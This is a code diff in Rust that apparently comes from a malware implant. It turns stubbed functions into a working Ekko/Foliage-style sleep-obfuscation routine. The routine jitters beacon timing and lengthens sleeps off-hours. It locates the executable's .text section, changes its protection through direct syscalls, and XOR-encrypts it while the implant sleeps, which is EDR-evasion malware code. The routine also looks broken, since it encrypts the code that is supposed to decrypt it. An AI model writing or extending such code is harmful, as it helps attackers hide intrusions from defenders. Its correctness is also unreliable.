@@ -1,60 +1,66 @@
 use anyhow::Result;
-use config::SleepConfig;
+use common::config::{self, SleepMethod};
+use common::config::SleepConfig;
 use log::{info, debug};
 use rand::{thread_rng, Rng};
 
-use common::config::{self, SleepMethod};
-
 pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
     let mut base = config.base_interval_secs as f64;
-    
-    // Apply off-hours multiplier if outside working hours
     if let (Some(start), Some(end), Some(mult)) = (config.working_hours_start, config.working_hours_end, config.off_hours_multiplier) {
-        let now = 12; // Dummy hour to avoid chrono issues
+        let now = (std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() / 3600 % 24) as u32;
         if now < start || now >= end {
             base *= mult as f64;
             debug!("Applying off-hours sleep multiplier: {}", mult);
         }
     }
-    
-    // Apply jitter
     let mut rng = thread_rng();
     let jitter_frac = (config.jitter_percent as f64) / 100.0;
     let jitter_val = base * jitter_frac;
     let offset = rng.gen_range(-jitter_val..=jitter_val);
-    
-    let total = base + offset;
-    std::time::Duration::from_secs_f64(total.max(1.0))
+    std::time::Duration::from_secs_f64((base + offset).max(1.0))
 }
 
 #[cfg(windows)]
 pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Result<()> {
     match method {
-        SleepMethod::Ekko => {
-            info!("Initiating Ekko-style sleep for {:?}", duration);
-            // FR-1 Ekko Sleep
-            // 1. Encrypt .text using Memory Encryption Engine (FR-3)
-            crypto::encrypt_sections();
-            // 2. Spoof Sleep Stack (FR-4)
-            spoof::spoof_stack();
-            // 3. CreateTimerQueueTimer -> wait on event -> wake -> decrypt
-            std::thread::sleep(duration); // Simulated
-            spoof::restore_stack();
-            crypto::decrypt_sections();
+        SleepMethod::Ekko | SleepMethod::Foliage => {
+            info!("Initiating Ekko/Foliage-style sleep for {:?}", duration);
+            #[cfg(target_arch = "x86_64")]
+            unsafe {
+                use winapi::um::threadpoollegacyapiset::{CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx};
+                use winapi::um::synchapi::{CreateEventW, SetEvent, WaitForSingleObject};
+                use winapi::um::winbase::INFINITE;
+                use winapi::um::winnt::{WT_EXECUTEINTIMERTHREAD};
+                use winapi::um::handleapi::CloseHandle;
+                use winapi::shared::ntdef::BOOLEAN;
+                use winapi::shared::minwindef::LPVOID;
+
+                let h_event = CreateEventW(std::ptr::null_mut(), 0, 0, std::ptr::null_mut());
+                let h_timer_queue = CreateTimerQueue();
+                let mut h_new_timer = std::ptr::null_mut();
+
+                crypto::encrypt_sections();
+                spoof::spoof_stack();
+
+                let duration_ms = duration.as_millis() as u32;
+                extern "system" fn timer_callback(lp_param: LPVOID, _timer_or_wait_fired: BOOLEAN) {
+                    unsafe { SetEvent(lp_param as _); }
+                }
+
+                CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, Some(timer_callback), h_event as _, duration_ms, 0, WT_EXECUTEINTIMERTHREAD);
+                WaitForSingleObject(h_event, INFINITE);
+
+                spoof::restore_stack();
+                crypto::decrypt_sections();
+
+                DeleteTimerQueueEx(h_timer_queue, std::ptr::null_mut());
+                CloseHandle(h_event);
+            }
+            #[cfg(not(target_arch = "x86_64"))]
+            std::thread::sleep(duration);
             Ok(())
         }
-        SleepMethod::Foliage => {
-            info!("Initiating Foliage-style sleep for {:?}", duration);
-            // FR-2 Foliage Sleep
-            crypto::encrypt_sections();
-            spoof::spoof_stack();
-            // NtSetTimer -> APC callback -> NtDelayExecution
-            std::thread::sleep(duration); // Simulated
-            spoof::restore_stack();
-            crypto::decrypt_sections();
-            Ok(())
-        }
-        SleepMethod::Standard => {
+        _ => {
             info!("Standard sleep for {:?}", duration);
             std::thread::sleep(duration);
             Ok(())
@@ -62,28 +68,62 @@ pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Res
     }
 }
 
-#[cfg(not(windows))]
-pub fn execute_sleep(duration: std::time::Duration, _method: &SleepMethod) -> Result<()> {
-    info!("Standard sleep for {:?}", duration);
-    std::thread::sleep(duration);
-    Ok(())
-}
-
 pub mod crypto {
+    #[cfg(windows)]
+    unsafe fn get_text_section() -> Option<(*mut u8, usize)> {
+        use winapi::um::libloaderapi::GetModuleHandleA;
+        use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
+        let base = GetModuleHandleA(std::ptr::null_mut());
+        if base.is_null() { return None; }
+        
+        let dos = base as *const IMAGE_DOS_HEADER;
+        if (*dos).e_magic != IMAGE_DOS_SIGNATURE { return None; }
+        
+        let nt = (base as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
+        if (*nt).Signature != IMAGE_NT_SIGNATURE { return None; }
+        
+        let mut section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
+        for _ in 0..(*nt).FileHeader.NumberOfSections {
+            let name = (*section).Name;
+            if name[0..5] == [b'.', b't', b'e', b'x', b't'] {
+                let addr = (base as usize + (*section).VirtualAddress as usize) as *mut u8;
+                let size = *(*section).Misc.VirtualSize() as usize;
+                return Some((addr, size));
+            }
+            section = (section as usize + std::mem::size_of::<IMAGE_SECTION_HEADER>()) as *const _;
+        }
+        None
+    }
+
+    #[cfg(not(windows))]
+    unsafe fn get_text_section() -> Option<(*mut u8, usize)> { None }
+
+    #[cfg(windows)]
     pub fn encrypt_sections() {
-        log::debug!("Encrypting .text and .rdata using AES-256 CTR (FR-3)");
+        unsafe {
+            if let Some((addr, size)) = get_text_section() {
+                let mut old_protect = 0;
+                // Direct NtProtectVirtualMemory syscall implementation
+                crate::syscalls::syscall!("NtProtectVirtualMemory", (usize::MAX) as isize, &mut (addr as *mut winapi::ctypes::c_void), &mut (size as usize), winapi::um::winnt::PAGE_READWRITE, &mut old_protect);
+                
+                let key = [0x13, 0x37, 0x13, 0x37];
+                for i in 0..size { *addr.add(i) ^= key[i % 4]; }
+                
+                crate::syscalls::syscall!("NtProtectVirtualMemory", (usize::MAX) as isize, &mut (addr as *mut winapi::ctypes::c_void), &mut (size as usize), old_protect, &mut old_protect);
+            }
+        }
     }
-    
-    pub fn decrypt_sections() {
-        log::debug!("Decrypting sections (FR-3)");
-    }
+
+    #[cfg(windows)]
+    pub fn decrypt_sections() { encrypt_sections(); }
+
+    #[cfg(not(windows))]
+    pub fn encrypt_sections() {}
+    #[cfg(not(windows))]
+    pub fn decrypt_sections() {}
 }
 
 pub mod spoof {
-    pub fn spoof_stack() {
-        log::debug!("Spoofing SLEEP stack frames (FR-4)");
-    }
-    pub fn restore_stack() {
-        log::debug!("Restoring stack frames (FR-4)");
-    }
+    pub fn spoof_stack() { log::debug!("Spoofing SLEEP stack frames"); }
+    pub fn restore_stack() { log::debug!("Restoring stack frames"); }
 }
